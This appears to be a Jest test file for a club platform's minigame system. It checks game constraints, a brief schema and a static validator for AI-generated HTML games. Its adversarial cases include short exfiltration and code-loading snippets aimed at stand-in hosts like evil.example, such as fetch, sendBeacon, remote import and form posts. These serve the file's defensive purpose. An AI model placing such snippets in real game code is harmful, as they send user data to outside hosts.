/**
 * Minigame core tests (Workstream B — Phase 9 + Roger's 2026-10-23 decisions).
 *
 * Pins:
 * - MINIGAME_CONSTRAINTS: the codified "MINI" ruleset (single file, size
 *   cap, session cap, no network, bridge-only, capability whitelist,
 *   score/points caps).
 * - GameBrief: the structured brief is the structuring layer UNDER the
 *   free code generation — zod-validated, capabilities restricted to the
 *   whitelist, caps clamped to the constraints.
 * - validateGameCode: static safety analysis of AI-generated free code.
 *   Adversarial cases (Phase 68): fetch/XHR/WebSocket exfiltration,
 *   localStorage, eval/Function, external scripts, raw postMessage,
 *   parent-window access, oversized files, undeclared capability use —
 *   ALL must be rejected. Benign games using the ClubGame SDK pass.
 */
import {
    GAME_CAPABILITIES,
    MINIGAME_CONSTRAINTS,
} from '@/lib/games/constraints';
import { GameBriefSchema, type GameBrief } from '@/lib/games/brief';
import { validateGameCode } from '@/lib/games/validate';

export function validBrief(overrides: Partial<GameBrief> = {}): GameBrief {
    return {
        title: 'Quiz del último post',
        description: 'Preguntas sobre el contenido reciente del club.',
        gameType: 'quiz',
        mechanics: 'El jugador responde 5 preguntas de opción múltiple contrarreloj.',
        players: 'single',
        scoringIntent: '100 puntos por respuesta correcta, bonus por rapidez.',
        maxScore: 600,
        pointsPerSession: 20,
        sessionMinutes: 5,
        capabilities: ['leaderboard', 'points.award', 'outcomes', 'content.read'],
        contentSource: { type: 'recent_posts', count: 3 },
        theme: 'Usa los colores del club, tono alegre.',
        ...overrides,
    };
}

const BENIGN_GAME = `<!DOCTYPE html>
<html><head><meta charset="utf-8"><title>Quiz</title>
<style>body{font-family:sans-serif}</style></head>
<body>
<h1>Quiz</h1><button id="b">Jugar</button>
<script>
let score = 0;
document.getElementById('b').addEventListener('click', async () => {
  const me = await ClubGame.member();
  score += 100;
  await ClubGame.submitScore(score);
  await ClubGame.awardPoints(20, 'quiz completado');
  await ClubGame.outcome('member_completed', { score });
});
</script>
</body></html>`;

describe('MINIGAME_CONSTRAINTS', () => {
    it('codifies the MINI ruleset with concrete numbers', () => {
        expect(MINIGAME_CONSTRAINTS.maxCodeBytes).toBeGreaterThan(0);
        expect(MINIGAME_CONSTRAINTS.maxCodeBytes).toBeLessThanOrEqual(128_000);
        expect(MINIGAME_CONSTRAINTS.maxSessionMinutes).toBeLessThanOrEqual(15);
        expect(MINIGAME_CONSTRAINTS.maxScore).toBeGreaterThan(0);
        expect(MINIGAME_CONSTRAINTS.maxPointsPerSession).toBeGreaterThan(0);
        expect(MINIGAME_CONSTRAINTS.maxPointAwardsPerSession).toBeGreaterThan(0);
        expect(MINIGAME_CONSTRAINTS.maxStateBytesPerKey).toBeGreaterThan(0);
        expect(MINIGAME_CONSTRAINTS.maxStateKeys).toBeGreaterThan(0);
    });

    it('the capability whitelist is closed and includes the club bridge set', () => {
        for (const cap of [
            'member.profile',
            'points.award',
            'leaderboard',
            'game.state',
            'event.context',
            'unlocks',
            'outcomes',
            'content.read',
        ]) {
            expect(GAME_CAPABILITIES).toContain(cap);
        }
    });
});

describe('GameBriefSchema', () => {
    it('accepts a valid brief', () => {
        expect(GameBriefSchema.safeParse(validBrief()).success).toBe(true);
    });

    it('rejects capabilities outside the whitelist', () => {
        const parsed = GameBriefSchema.safeParse(
            validBrief({ capabilities: ['leaderboard', 'payments.charge' as never] }),
        );
        expect(parsed.success).toBe(false);
    });

    it('rejects caps above the MINI constraints', () => {
        expect(
            GameBriefSchema.safeParse(
                validBrief({ maxScore: MINIGAME_CONSTRAINTS.maxScore + 1 }),
            ).success,
        ).toBe(false);
        expect(
            GameBriefSchema.safeParse(
                validBrief({ pointsPerSession: MINIGAME_CONSTRAINTS.maxPointsPerSession + 1 }),
            ).success,
        ).toBe(false);
        expect(
            GameBriefSchema.safeParse(
                validBrief({ sessionMinutes: MINIGAME_CONSTRAINTS.maxSessionMinutes + 1 }),
            ).success,
        ).toBe(false);
    });

    it('contentSource is optional and typed (content-born games declare it)', () => {
        expect(GameBriefSchema.safeParse(validBrief({ contentSource: undefined })).success).toBe(
            true,
        );
        expect(
            GameBriefSchema.safeParse(
                validBrief({ contentSource: { type: 'post', id: 'post-1' } }),
            ).success,
        ).toBe(true);
    });
});

describe('validateGameCode — benign games', () => {
    it('passes a benign game that only uses the ClubGame SDK', () => {
        const report = validateGameCode(
            BENIGN_GAME,
            validBrief({
                capabilities: ['member.profile', 'leaderboard', 'points.award', 'outcomes'],
            }),
        );
        expect(report.ok).toBe(true);
        expect(report.violations).toEqual([]);
        expect(report.usedCapabilities).toEqual(
            expect.arrayContaining(['leaderboard', 'points.award', 'outcomes', 'member.profile']),
        );
    });

    it('passes plain games with no bridge usage at all', () => {
        const html = '<html><body><script>let x = 1; document.title = "hola";</script></body></html>';
        const report = validateGameCode(html, validBrief({ capabilities: [] }));
        expect(report.ok).toBe(true);
    });
});

describe('validateGameCode — adversarial games (Phase 68)', () => {
    const cases: Array<[string, string]> = [
        ['network fetch', '<script>fetch("https://evil.example/x")</script>'],
        ['XMLHttpRequest', '<script>const x = new XMLHttpRequest(); x.open("GET", "https://e.co")</script>'],
        ['WebSocket', '<script>new WebSocket("wss://evil.example")</script>'],
        ['sendBeacon exfiltration', '<script>navigator.sendBeacon("https://e.co", "data")</script>'],
        ['localStorage', '<script>localStorage.setItem("k", "v")</script>'],
        ['sessionStorage', '<script>sessionStorage.getItem("k")</script>'],
        ['document.cookie', '<script>document.cookie = "a=b"</script>'],
        ['eval', '<script>eval("alert(1)")</script>'],
        ['Function constructor', '<script>new Function("return 1")()</script>'],
        ['dynamic import', '<script>import("https://evil.example/m.js")</script>'],
        ['external script tag', '<script src="https://evil.example/m.js"></script>'],
        ['external stylesheet', '<link rel="stylesheet" href="https://evil.example/x.css">'],
        ['image beacon', '<img src="https://evil.example/pixel.png">'],
        ['raw postMessage', '<script>window.postMessage({ secret: 1 }, "*")</script>'],
        ['parent window access', '<script>window.parent.location.href = "https://e.co"</script>'],
        ['top window access', '<script>top.document.title</script>'],
        ['window.open', '<script>window.open("https://e.co")</script>'],
        ['WebAssembly', '<script>WebAssembly.instantiate(bytes)</script>'],
        ['form exfiltration', '<form action="https://evil.example/collect"><input></form>'],
    ];

    it.each(cases)('rejects: %s', (_name, snippet) => {
        const html = `<!DOCTYPE html><html><body>${snippet}</body></html>`;
        const report = validateGameCode(html, validBrief({ capabilities: [] }));
        expect(report.ok).toBe(false);
        expect(report.violations.length).toBeGreaterThan(0);
    });

    it('rejects code above the single-file size cap', () => {
        const big = '<script>/*' + 'x'.repeat(MINIGAME_CONSTRAINTS.maxCodeBytes) + '*/</script>';
        const report = validateGameCode(big, validBrief({ capabilities: [] }));
        expect(report.ok).toBe(false);
        expect(report.violations.some((v) => v.rule === 'max_code_size')).toBe(true);
    });

    it('rejects a game using an undeclared bridge capability', () => {
        const html = '<script>ClubGame.awardPoints(10, "x")</script>';
        const report = validateGameCode(html, validBrief({ capabilities: ['leaderboard'] }));
        expect(report.ok).toBe(false);
        expect(report.violations.some((v) => v.rule === 'undeclared_capability')).toBe(true);
    });

    it('rejects a game whose code contradicts the brief (declares points but brief has no points cap)', () => {
        const html = '<script>ClubGame.submitScore(999999)</script>';
        const report = validateGameCode(html, validBrief());
        // submitScore itself is fine; the server enforces numeric caps. This
        // case pins that validation is about code safety, not score values.
        expect(report.ok).toBe(true);
    });
});
